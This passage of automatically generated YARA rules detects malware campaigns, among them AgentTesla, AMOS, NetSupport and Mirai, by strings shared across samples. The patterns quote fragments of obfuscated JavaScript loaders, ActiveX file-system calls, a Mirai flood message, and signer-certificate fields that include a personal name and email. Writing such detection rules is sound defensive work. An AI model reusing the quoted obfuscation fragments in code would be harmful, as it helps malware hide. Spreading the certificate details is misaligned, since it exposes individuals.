        $s8 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s9 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s10 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s11 = "Potencijalna energija po plimi: {0:N0} kWh" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1841152 and 12 of them
}

rule Sightlines_tlsh_f970b1f7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f970b1f7"
        date = "2026-10-16"
        campaign = "tlsh-f970b1f7"
        family = ""
        hash = "097556fb58f7fcae9dba3c87410b1ee29c6d8185388929cde9afefc7dc55bbfa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f970b1f7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "var _tmpx=[34,83,66,74,87,34],_tmpk=7,_tmp=\"\"; for(var _tmpi=0;_tmpi<_tmpx.length;_tmpi++)_tmp+=_xF(" ascii
        $s1 = "var _mtx=[72,96,113,109,106,97,118,90],_mtk=5,_mt=\"\"; for(var _mti=0;_mti<_mtx.length;_mti++)_mt+=_x" ascii
        $s2 = "var _swx=[87,108,107,115,83,109,106,96,107,115],_swk=4,_sw=\"\"; for(var _swi=0;_swi<_swx.length;_swi+" ascii
        $s3 = "var _dfx=[74,107,98,107,122,107,72,103,98,107],_dfk=14,_df=\"\"; for(var _dfi=0;_dfi<_dfx.length;_dfi+" ascii
        $s4 = "var hex = (value & 0xFFFF).toString(16).toUpperCase();" ascii
        $s5 = "var _itmx=[74,119,102,110],_itmk=3,_itm=\"\"; for(var _itmi=0;_itmi<_itmx.length;_itmi++)_itm+=_xF(_it" ascii
        $s6 = "var childAttribute = new NS_Mdl.Element();" ascii
        $s7 = "toyKey = secret.hexKey ? secret.toyKey : ((pmk[0] << 8) | pmk[1]) & 0xFFFF;" ascii
        $s8 = "var _ipx=[69,98,92,109,126,109,97,105,120,105,126,127],_ipk=12,_ip=\"\"; for(var _ipi=0;_ipi<_ipx.leng" ascii
        $s9 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s10 = "var attributes = new NS_Mdl.ElementArray();" ascii
        $s11 = "var _flrx=[111,101,102,102,123],_flrk=9,_flr=\"\"; for(var _flri=0;_flri<_flrx.length;_flri++)_flr+=_x" ascii
    condition:
        filesize < 2870714 and 12 of them
}

rule Sightlines_signer_cert_sha1_055cf2db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-055cf2db"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-055cf2db"
        family = ""
        hash = "086e083da4e7a46438aff3188beb2c0d14cb38af216c62a880cd8209dfcfcca8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-055cf2db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "250911201113Z0t1" ascii
        $s1 = "230012+5029260" ascii
        $s2 = "240912201113Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2816096 and 3 of them
}

rule Sightlines_tlsh_322cdf80_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-322cdf80"
        date = "2026-10-16"
        campaign = "tlsh-322cdf80"
        family = ""
        hash = "0f8976cee8d60f7c8c2826f36db4a09f30fff94effb652cabca2efda9b4c2bf2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-322cdf80.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "'System.Globalization.DateTimeFormatInfo+" ascii
        $s5 = "+System.Globalization.GregorianCalendarTypes" ascii
        $s6 = "matInfo&System.Globalization.GregorianCalendar" ascii
        $s7 = "(System.Globalization.DateTimeFormatFlags" ascii
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "Izvoz nije uspio ili datoteka ne zadovoljava XSD." wide
        $s10 = "ene zadane vrijednosti (nisu spremljene)." wide
        $s11 = "FAD8FE75086C160174BE22832BEBEBC9DA04C4CB395275AD8ADB10EA3A949B3F" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1713152 and 12 of them
}

rule Sightlines_tlsh_1cb5eb26_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1cb5eb26"
        date = "2026-10-16"
        campaign = "tlsh-1cb5eb26"
        family = "amos"
        hash = "57a671a61a6fbebe17b09d9baa5712d3b0af8232fd807697183c6b1fb67286a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1cb5eb26.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s1 = "/System/Library/Frameworks/Security.framework/Versions/A/Security" ascii
        $s2 = "/usr/lib/libSystem.B.dylib" ascii
        $s3 = "/usr/lib/libc++.1.dylib" ascii
        $s4 = "@___stack_chk_guard" ascii
        $s5 = "@dyld_stub_binder" ascii
        $s6 = "@_mach_task_self_" ascii
        $s7 = "@___stack_chk_fail" ascii
        $s8 = "@_pthread_once" ascii
        $s9 = "__la_symbol_ptr" ascii
        $s10 = "__mod_init_func" ascii
        $s11 = "@___clear_cache" ascii
    condition:
        filesize < 2661984 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9beec038_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9beec038"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-9beec038"
        family = ""
        hash = "152d4753839330b04a221d9e97093de27dcf5a4231fbd948940da26d909dd5b1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9beec038.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s3 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s6 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
        $s7 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s8 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s9 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s10 = "Potencijalna energija po plimi: {0:N0} kWh" wide
        $s11 = "Datoteka PodaciKonfiguracije.xml nije prona" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2622464 and 12 of them
}

rule Sightlines_tlsh_3275a08d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3275a08d"
        date = "2026-10-16"
        campaign = "tlsh-3275a08d"
        family = ""
        hash = "05e61a33cd451d1496c7cf05a3f7bf739708ad2198d1ef2f05dc1f5eb2236138"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3275a08d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "Kondicija goveda pri silasku (BCS): {0:F2} / 5.00" wide
        $s2 = "Pomuzeno mlijeka: {0:N1} litara (Prosjek po grlu: {1:F1} L/sezoni)" wide
        $s3 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s4 = "Kondicija goveda pri silasku (BCS): 4.30" wide
        $s5 = "Rani snijeg: PRISILNI SILAZAK U TIJEKU! Stado se povla" wide
        $s6 = "Procjena vrijednosti sira: {0:N2} EUR (24.50 " wide
        $s7 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s9 = "Proizvodnja sira: {0} koluta (~{1} kg tvrdog planinskog sira)" wide
        $s10 = "no izvezeni u XML prema StadoPodaci.xsd shemi!" wide
        $s11 = "Ocjena: Izvrsno (A+) - Vrhunska transhumanca" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1937408 and 12 of them
}

rule Sightlines_tlsh_363a15b5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-363a15b5"
        date = "2026-10-16"
        campaign = "tlsh-363a15b5"
        family = ""
        hash = "adb8c2a61d8e539016e06a43c1a6b051978021660e9f3245d1107fe9d29af078"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-363a15b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "Rok pokrovitelja: rukopis predan, {0:0.0} od {1} mjeseci" wide
        $s4 = "Pisari rade pri dnevnom svjetlu ({0:0.0} h svjetla)." wide
        $s5 = "Tinta dostaje za oko {3:0} folija, pergament za {4:0} folija." wide
        $s6 = "The value for column 'DataColumn2' in table 'DataTable1' is DBNull." wide
        $s7 = "The value for column 'DataColumn3' in table 'DataTable1' is DBNull." wide
        $s8 = "The value for column 'DataColumn4' in table 'DataTable1' is DBNull." wide
        $s9 = "The value for column 'DataColumn5' in table 'DataTable1' is DBNull." wide
        $s10 = "The value for column 'DataColumn1' in table 'DataTable1' is DBNull." wide
        $s11 = "Dnevno svjetlo: {0:0.0} h, radnih sati: {1:0.0}" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1712128 and 12 of them
}

rule Sightlines_signer_cert_sha1_8f60bad4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-8f60bad4"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-8f60bad4"
        family = ""
        hash = "23f04ba936568e9a7c9dce7a6beb52c9be7eb13b734cd390c99e7546cbe1973d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-8f60bad4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "AddTrust External TTP Network1\"0 " ascii
        $s1 = ".?AV_Iostream_error_category@std@@" ascii
        $s2 = "AddTrust External CA Root0" ascii
        $s3 = "Melnikova st. 15, 5 apt.1" ascii
        $s4 = "mail.to.twaego@gmail.com0" ascii
        $s5 = "UTN-USERFirst-Object0" ascii
        $s6 = "Artem Shevchenko0" ascii
        $s7 = "Artem Shevchenko1" ascii
        $s8 = "AddTrust AB1&0$" ascii
        $s9 = "Salt Lake City1" ascii
        $s10 = "301231235959Z0|1" ascii
        $s11 = "200530104838Z0z1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 30458592 and 11 of them
}

rule Sightlines_signer_cert_sha1_b0e443fb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-b0e443fb"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-b0e443fb"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-b0e443fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0 " ascii
        $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " ascii
        $s2 = "+SSL.com Code Signing Intermediate CA RSA R10" ascii
        $s3 = "(SSL.com Root Certification Authority RSA0" ascii
        $s4 = "https://www.ssl.com/repository0" ascii
        $s5 = "Pelican Finland Holding Oy0" ascii
        $s6 = "Pelican Self Storage1#0!" ascii
        $s7 = "SSL Corporation110/" ascii
        $s8 = "270826130109Z0v1" ascii
        $s9 = "410212173939Z0|1" ascii
        $s10 = "341112185005Z0n1" ascii
        $s11 = "341112185005Z0s1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 24638128 and 12 of them
}

rule Sightlines_tlsh_ff965ad2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ff965ad2"
        date = "2026-10-15"
        campaign = "tlsh-ff965ad2"
        family = ""
        hash = "24f1dfaa9847f556973ea2443051646a3e6adf8991b3ef5e193e9642d8efaa8b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ff965ad2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_55d38a5e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-55d38a5e"
        date = "2026-10-15"
        campaign = "tlsh-55d38a5e"
        family = ""
        hash = "2dc4cd857195e02522a9a4c666c69c263517ded672775911241bdcb39af36b5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-55d38a5e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "knownArmAmdGcnAarch64AsmjsAvrBpfebBpfelHexagonX86_32M68kLoongArch64Mips32Mips64Msp430Nvptx64Pulley32" ascii
        $s1 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s2 = "SizeLimitExhaustedInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s3 = "StringLinkerNoteMetadataElfCompilationLinkageDynamicAarch64_Ilp32BpfCskyE2K32E2K64I386X86_64_X32Mips" ascii
        $s4 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s5 = "CritEdgeSSABBBranchEntryLiveinDisallowedBranchArgTooManyLiveRegsU6x0x1x2x3x4x5x6x7x8x9x10x11x12x13x1" ascii
        $s6 = "vmctxassertion failed: !(res.read_bit(BIT_LITTLE_ENDIAN) && res.read_bit(BIT_BIG_ENDIAN))" ascii
        $s7 = "assertion failed: max <= MAX_LOWERED_TYPES" ascii
        $s8 = "GenericX86SignedX86RipRelativeX86RipRelativeMovqX86BranchS390xDblAArch64CallLoongArchBranchSharcType" ascii
        $s9 = "rowSwitchI64Add128I64Sub128I64MulWideSI64MulWideUAcqRelSeqCstEngineModuleRecGroupModuleInternedTypeI" ascii
        $s10 = "iCudaCygwinDarwinDragonflyEmscriptenEspidfFreebsdFuchsiaHaikuHermitHorizonHurdIllumosIOSL4reLinuxMac" ascii
        $s11 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11484160 and 12 of them
}

rule Sightlines_tlsh_0e4f7d14_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0e4f7d14"
        date = "2026-10-15"
        campaign = "tlsh-0e4f7d14"
        family = ""
        hash = "0234f3afddedb16450e7f9c51ec55a3c935ce568806a7c1888aae048d44ae441"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0e4f7d14.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s1 = "i32i64f32f64StackOverflowMemoryOutOfBoundsHeapMisalignedTableOutOfBoundsIndirectCallToNullBadSignatu" ascii
        $s2 = "<assemblyIdentity version=\"1.0.0.0\" name=\"mozglue\" type=\"win32\"/>" ascii
        $s3 = "assertion failed: code < MAX_HUFF_SYMBOLS_2" ascii
        $s4 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s5 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s6 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s7 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s8 = "a Display implementation returned an error unexpectedly_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f" ascii
        $s9 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s10 = "Utf8Errorvalid_up_toerror_lenNoneSomeAccessError_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s11 = "?InvalidArrayIndex_CRASH@detail@mozilla@@YAX_K0@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1309696 and 12 of them
}

rule Sightlines_tlsh_52e4e256_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52e4e256"
        date = "2026-10-15"
        campaign = "tlsh-52e4e256"
        family = ""
        hash = "212ffc04072e2ef3ec7a97f347286522ddf0e89f4384b10e8b124d818177ccb2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52e4e256.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s1 = "SizeLimitExhaustedParseIntErrorInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee720" ascii
        $s2 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
        $s4 = "i1\"AWouldBlockthread name may not contain interior null bytes_______ac68faa20c58cbccd01ee7208bf3b6e9" ascii
        $s5 = "RNG failedWrongAlgorithmInvalidEncodingUnexpectedErrorInvalidComponentPublicKeyIsMissingVersionNotSu" ascii
        $s6 = "ring::signature::ED25519assertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s7 = "accept confirmationhrr ech accept confirmationCLIENT_EARLY_TRAFFIC_SECRETCLIENT_HANDSHAKE_TRAFFIC_SE" ascii
        $s8 = "SystemRandomRsaParameterspadding_algmin_bitsNoKeyLogCrlsRequiredRingTLS_NULL_WITH_NULL_NULLTLS_PSK_W" ascii
        $s9 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s10 = "'..= | !nullboolcharstri8i16i32i64i128isizeu64u128usizef32f64!..._R__R" ascii
        $s11 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3345408 and 12 of them
}

rule Sightlines_tlsh_fca0e583_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fca0e583"
        date = "2026-10-15"
        campaign = "tlsh-fca0e583"
        family = ""
        hash = "029b03807c184b47ff2dd6b12b6863d478c955e77aa28dfa5c1e41170e1582ec"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fca0e583.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        'WQFcKe4VwmodWRiSWRrGyGBcRSkCvw/cS8kPFSkiW5TIfLq0WOPKWQ9tW7SlgYRcOKpdHSkqwG'," ascii
        $s1 = "    var _0x3941ab = _0x153578, _0x1ff19 = new ActiveXObject('Scripting.FileSystemObject'), _0x327902" ascii
        $s2 = "_0x45094b] = _0x47080f, _0x37cb16 += String['fromCharCode'](_0x52f160['charCodeAt'](_0x53e6f0) ^ _0x" ascii
        $s3 = "        'osXgWOHYhCofW5GTESk0W5HICCk4fmkyWOvrWQxdJfldLmk/W7BdJqO3bYCBmh7cLmoWWOuOW5W'," ascii
        $s4 = "0x2e1e63, _0x15713d++ % 0x4) ? _0x5f0495 += String['fromCharCode'](0xff & _0x8bd6b5 >> (-0x2 * _0x15" ascii
        $s5 = " = new ActiveXObject(_0x241a86(0xb)), _0x5567be = new ActiveXObject(_0x241a86(0x6));" ascii
        $s6 = "charAt'](_0x16c375++); ~_0x2e1e63 && (_0x8bd6b5 = _0x15713d % 0x4 ? _0x8bd6b5 * 0x40 + _0x2e1e63 : _" ascii
        $s7 = " _0x47e244 = _0x2a1b['IkeedN'](_0x47e244, _0x2a1b2c), _0x2a1b['gRDGQH'][_0x237bd3] = _0x47e244) : _0" ascii
        $s8 = "    var _0x29e03d = _0x2a1b['gRDGQH'][_0x237bd3];" ascii
        $s9 = "_0x1c257c['length'])) % 0x100, _0x47080f = _0x4866af[_0x21b1d0], _0x4866af[_0x21b1d0] = _0x4866af[_0" ascii
        $s10 = "    function _0x2030db(_0x8971ea, _0x3ce2b4) {" ascii
        $s11 = "function _0x1564(_0x2c72ce, _0x7b9d5) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_237ed4c4_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-237ed4c4"
        date = "2026-10-15"
        campaign = "tlsh-237ed4c4"
        family = "agenttesla"
        hash = "21f53d2b3cf28862d7ecf4692993a6ea24f222c0d621d78254f826f575415c92"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-237ed4c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "var _tmpx=[34,83,66,74,87,34],_tmpk=7,_tmp=\"\"; for(var _tmpi=0;_tmpi<_tmpx.length;_tmpi++)_tmp+=_xF(" ascii
        $s1 = "var _mtx=[72,96,113,109,106,97,118,90],_mtk=5,_mt=\"\"; for(var _mti=0;_mti<_mtx.length;_mti++)_mt+=_x" ascii
        $s2 = "var _swx=[87,108,107,115,83,109,106,96,107,115],_swk=4,_sw=\"\"; for(var _swi=0;_swi<_swx.length;_swi+" ascii
        $s3 = "var _dfx=[74,107,98,107,122,107,72,103,98,107],_dfk=14,_df=\"\"; for(var _dfi=0;_dfi<_dfx.length;_dfi+" ascii
        $s4 = "var hex = (value & 0xFFFF).toString(16).toUpperCase();" ascii
        $s5 = "var _itmx=[74,119,102,110],_itmk=3,_itm=\"\"; for(var _itmi=0;_itmi<_itmx.length;_itmi++)_itm+=_xF(_it" ascii
        $s6 = "var childAttribute = new NS_Mdl.Element();" ascii
        $s7 = "toyKey = secret.hexKey ? secret.toyKey : ((pmk[0] << 8) | pmk[1]) & 0xFFFF;" ascii
        $s8 = "var _ipx=[69,98,92,109,126,109,97,105,120,105,126,127],_ipk=12,_ip=\"\"; for(var _ipi=0;_ipi<_ipx.leng" ascii
        $s9 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s10 = "var attributes = new NS_Mdl.ElementArray();" ascii
        $s11 = "var _flrx=[111,101,102,102,123],_flrk=9,_flr=\"\"; for(var _flri=0;_flri<_flrx.length;_flri++)_flr+=_x" ascii
    condition:
        filesize < 1170342 and 12 of them
}

rule Sightlines_signer_cert_sha1_9325759a_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-9325759a"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-9325759a"
        family = "netsupport"
        hash = "06a0a243811e9c4738a9d413597659ca8d07b00f640b74adc9cb351c179b3268"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-9325759a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".Netsupport House Towngate East, Market Deeping1" ascii
        $s1 = "!Copyright (c) 2023 NetSupport Ltd" wide
        $s2 = "is@netsupportsoftware.com0" ascii
        $s3 = "Private Organization1" ascii
        $s4 = "NETSUPPORT LTD.1(0&" ascii
        $s5 = "Peterborough1705" ascii
        $s6 = "341209171340Z0]1" ascii
        $s7 = "250617130115Z0" ascii
        $s8 = "220617130115Z" ascii
        $s9 = "300728000000Z0\\1" ascii
        $s10 = "231107171340Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_rich_header_hash_6a7fcf10_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6a7fcf10"
        date = "2026-10-15"
        campaign = "rich_header_hash-6a7fcf10"
        family = ""
        hash = "0e823fe2692ba740b73c8f0cc47f2d732ede3b17dd7d268219e7e1611b9ae239"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6a7fcf10.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "tUH9\\$htN9\\$`~H" ascii
        $s1 = "H USVWATAUAVAWH" ascii
        $s2 = " BD8d$`t5M" ascii
        $s3 = "0uNH9|$@tG" ascii
        $s4 = "D$ H5J)n(H" ascii
        $s5 = "D$@H5`fZ8H" ascii
        $s6 = "D$pH5*UBoH" ascii
        $s7 = "D$pH50B|ZH" ascii
        $s8 = "HcD$`Hc\\$8H" ascii
        $s9 = "]ofD9\"t#H" ascii
        $s10 = "mKD9s ~yI" ascii
        $s11 = "xJL9l$PtC" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4399140 and 12 of them
}

rule Sightlines_host_0788bc0b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-0788bc0b"
        date = "2026-10-18"
        campaign = "host-0788bc0b"
        family = "mirai"
        hash = "0a3599e38ceb3be32e3c9ec5a15cfd3959476d08d69587cf24f7149ebe7c057b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-0788bc0b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii
        $s3 = "%s: cannot apply additional memory protection after relocation" ascii
        $s4 = "%s: '%s' has more than one dynamic section" ascii
        $s5 = "[udpbypass_flood] started: ('%d')" ascii
        $s6 = "%s: '%s' is missing a dynamic section" ascii
        $s7 = "Modules for application (%p):" ascii
        $s8 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s9 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s10 = "Not an ELF shared library" ascii
        $s11 = "mmap of a spare page failed!" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 6 of them
}
